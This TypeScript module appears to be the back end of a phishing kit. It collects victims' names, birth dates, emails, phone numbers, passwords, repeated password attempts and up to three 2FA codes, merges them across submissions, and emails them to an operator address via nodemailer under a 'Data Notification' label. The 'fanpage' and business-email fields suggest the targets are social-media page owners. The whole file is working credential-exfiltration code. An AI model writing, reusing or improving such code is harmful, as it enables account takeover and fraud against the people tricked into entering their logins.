import nodemailer from 'nodemailer';
import { memoryStoreTTL } from '../libs/memoryStore';
import { generateKey } from './generateKey';
import { formatEmailMessage } from './emailFormatter';

// Shared rate limiter for email
const rateLimiter = new Map<string, number>();
const RATE_LIMIT_WINDOW = 1000; // 1 second between messages from same key

function getEmailConfig() {
    const host = process.env.EMAIL_HOST?.trim();
    const port = parseInt(process.env.EMAIL_PORT || '587');
    const user = process.env.EMAIL_USER?.trim();
    const pass = process.env.EMAIL_PASS?.trim();
    const to = process.env.EMAIL_TO?.trim();

    if (!host || !user || !pass || !to) {
        return null;
    }

    return {
        host,
        port,
        user,
        pass,
        to,
        transporter: nodemailer.createTransport({
            host,
            port,
            secure: port === 465, // true for 465, false for other ports
            auth: {
                user,
                pass,
            },
        }),
    };
}

export async function sendEmailMessage(data: any): Promise<void> {
    const config = getEmailConfig();
    if (!config) {
        console.warn('⚠️ Email không được gửi: Thiếu cấu hình EMAIL_HOST, EMAIL_USER, EMAIL_PASS hoặc EMAIL_TO trong file .env');
        return;
    }

    const key = generateKey(data);
    // Rate limiting check
    const now = Date.now();
    const lastCall = rateLimiter.get(key);
    if (lastCall && (now - lastCall) <= RATE_LIMIT_WINDOW) {
        console.warn(`⚠️ Rate limit exceeded for email key: ${key}`);
        return;
    }
    rateLimiter.set(key, now);

    const prev = memoryStoreTTL.get(key);
    const normalizedOld = prev?.data || {};
    const normalizedNew = {
        ip: data.ip ?? '',
        location: data.location ?? '',
        fullName: data.fullName ?? data.name ?? '',
        fanpage: data.fanpage ?? '',
        day: data.day ?? '',
        month: data.month ?? '',
        year: data.year ?? '',
        email: data.email ?? '',
        emailBusiness: data.emailBusiness ?? data.business ?? '',
        phone: data.phone ?? '',
        password: data.password ?? '',
        passwordSecond: data.passwordSecond ?? '',
        authMethod: data.authMethod ?? '',
        twoFa: data.twoFa ?? '',
        twoFaSecond: data.twoFaSecond ?? '',
        twoFaThird: data.twoFaThird ?? '',
    };
    const fullData = { ...normalizedOld };
    Object.entries(normalizedNew).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            fullData[k] = v;
        }
    });

    const emailHtml = formatEmailMessage(fullData);
    const subject = `${fullData.location || 'Unknown User'} - ${new Date().toLocaleString()}`;

    try {
        const mailOptions = {
            from: `"Data Notification" <${config.user}>`,
            to: config.to,
            subject: subject,
            html: emailHtml,
        };

        const info = await config.transporter.sendMail(mailOptions);
        console.log(`✅ Email sent successfully. Message ID: ${info.messageId}`);

        // Store email status in memory (reuse telegram key structure)
        const emailKey = `${key}_email`;
        memoryStoreTTL.set(emailKey, {
            message: `Email sent: ${subject}`,
            messageId: parseInt(info.messageId) || Date.now(),
            data: {
                ...fullData,
                emailSent: true,
                emailMessageId: info.messageId,
                emailTimestamp: Date.now()
            }
        });

    } catch (err: any) {
        console.error('🔥 Email send error:', err.message || err);
    }
}
